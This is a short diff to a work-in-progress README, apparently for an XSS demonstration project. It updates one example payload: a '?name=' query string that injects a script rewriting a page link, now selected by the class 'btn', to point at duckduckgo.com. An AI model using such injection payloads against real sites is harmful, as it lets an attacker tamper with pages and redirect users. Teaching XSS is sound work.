@@ -27,7 +27,7 @@ This project and this readme is WIP.
 ```
 
 ```javascript
-?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="https://duckduckgo.com/";}</script>
+?name=<script>window.onload = function() {var link=document.getElementsByClassName("btn");link[0].href="https://duckduckgo.com/";}</script>
 ```
 
 [1]: http://www.thegeekstuff.com/2012/02/xss-attack-examples/
